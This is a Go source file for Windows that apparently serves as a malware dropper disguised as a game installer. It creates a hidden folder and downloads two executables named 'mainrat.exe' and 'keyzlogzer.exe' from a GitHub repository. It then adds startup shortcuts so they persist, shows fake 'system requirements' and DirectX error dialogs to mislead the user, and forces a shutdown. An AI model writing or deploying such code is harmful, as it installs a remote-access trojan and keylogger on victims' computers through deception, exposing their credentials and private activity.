package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	shell32           = syscall.NewLazyDLL("shell32.dll")
	shGetFolderPathA  = shell32.NewProc("SHGetFolderPathA")
	user32            = syscall.NewLazyDLL("user32.dll")
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	procMessageBoxW   = user32.NewProc("MessageBoxW")
	procCreateWindow  = user32.NewProc("CreateWindowExW")
	procDestroyWindow = user32.NewProc("DestroyWindow")
	procShowWindow    = user32.NewProc("ShowWindow")
	procUpdateWindow  = user32.NewProc("UpdateWindow")
)

// Create hidden folder
func MakeHiddenFolder(path string) error {
	err := os.MkdirAll(path, 0700)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(syscall.StringToUTF16Ptr(path), syscall.FILE_ATTRIBUTE_HIDDEN)
}

// Copy file
func CopyFile(sourcePath, destPath string) error {
	src, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer src.Close()

	dest, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer dest.Close()

	_, err = dest.ReadFrom(src)
	return err
}

// Get Startup folder path
func GetStartupFolder() (string, error) {
	var path [syscall.MAX_PATH]byte
	csidlStartup := 0x0007
	r, _, _ := shGetFolderPathA.Call(0, uintptr(csidlStartup), 0, 0, uintptr(unsafe.Pointer(&path[0])))
	if r != 0 {
		return "", fmt.Errorf("SHGetFolderPathA failed")
	}
	return string(path[:strings.IndexByte(string(path[:]), 0)]), nil
}

// Create shortcut to file in startup
func CreateShortcutToStartup(targetPath, shortcutName string) error {
	startupFolder, err := GetStartupFolder()
	if err != nil {
		return err
	}
	shortcutPath := filepath.Join(startupFolder, shortcutName+".lnk")
	workingDir := filepath.Dir(targetPath)

	// Escape Windows paths
	escapedTarget := strings.ReplaceAll(targetPath, `\`, `\\`)
	escapedShortcut := strings.ReplaceAll(shortcutPath, `\`, `\\`)
	escapedWorkingDir := strings.ReplaceAll(workingDir, `\`, `\\`)

	psScript := fmt.Sprintf(`
$s = New-Object -ComObject WScript.Shell
$shortcut = $s.CreateShortcut("%s")
$shortcut.TargetPath = "%s"
$shortcut.WorkingDirectory = "%s"
$shortcut.WindowStyle = 1
$shortcut.Description = "Auto run"
$shortcut.Save()
`, escapedShortcut, escapedTarget, escapedWorkingDir)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
	return cmd.Run()
}

// Download file to given destination dir
func DownloadFile(fileURL, destinationDir string) (string, error) {
	// Make sure directory exists
	if _, err := os.Stat(destinationDir); os.IsNotExist(err) {
		os.MkdirAll(destinationDir, 0755)
	}

	// Get filename
	fileName := filepath.Base(fileURL)
	if !strings.Contains(fileName, ".") {
		fileName += ".bin"
	}

	// Final path
	filePath := filepath.Join(destinationDir, fileName)

	// Download
	resp, err := http.Get(fileURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return "", err
	}

	return filePath, nil
}

func showFakeLoader() uintptr {
	// Display a basic MessageBox as fake loader
	// HWND = 0, text = "Checking system requirements...", title = "Loading", MB_OKCANCEL = 0
	ret, _, _ := procMessageBoxW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Please wait while we check your system requirements..."))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Loading"))),
		0x40, // MB_ICONINFORMATION
	)
	return ret
}

func showErrorMsg() {
	showFakeLoader()
	time.Sleep(2 * time.Second) // Simulate fake processing time

	title := "Error"
	message := "Error: Your system doesn't meet the minimum requirement of DirectX 12"

	procMessageBoxW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0x10, // MB_ICONERROR
	)
}
func showInfoMsg() {
	user32 := syscall.NewLazyDLL("user32.dll")
	msgBox := user32.NewProc("MessageBoxW")

	title := "Wait"
	message := "Waiting to download the installer press Ok to continue"

	// HWND = 0, Text, Title, MB_ICONINFORMATION = 0x40
	msgBox.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0x40, // MB_ICONINFORMATION (blue exclamation/info icon)
	)
}

func shutdownIn10Seconds() error {
	cmd := exec.Command("shutdown", "/s", "/t", "10", "/f")
	return cmd.Run()
}
func main() {
	// Step 1: Create hidden folder
	targetFolder := `C:\Users\LINA\Desktop\games\sys64`
	if err := MakeHiddenFolder(targetFolder); err != nil {
		fmt.Println("Failed to create hidden folder:", err)
		return
	}
	showInfoMsg()

	// Step 2: Download files to that folder with retry loop
	urls := []string{
		"https://github.com/NobelTad/test/raw/refs/heads/main/mainrat.exe",
		"https://github.com/NobelTad/test/raw/refs/heads/main/keyzlogzer.exe",
	}

	for _, url := range urls {
		var filePath string
		var err error

		// Retry loop until successful
		for {
			fmt.Println("Trying to download:", url)
			filePath, err = DownloadFile(url, targetFolder)
			if err != nil {
				fmt.Println("Download failed, retrying in 5 seconds:", err)
				time.Sleep(5 * time.Second)
				continue
			}
			break
		}

		fmt.Println("Downloaded successfully:", filePath)

		// Step 3: Create shortcut in Startup
		name := strings.TrimSuffix(filepath.Base(filePath), filepath.Ext(filePath))
		if err := CreateShortcutToStartup(filePath, name); err != nil {
			fmt.Println("Failed to create startup shortcut for", filePath, ":", err)
		}
	}

	fmt.Println("All done.")
	showErrorMsg()

	err := shutdownIn10Seconds()
	if err != nil {
		fmt.Println("Shutdown failed:", err.Error())
	} else {
		fmt.Println("System will shut down in 10 seconds.")
	}
}
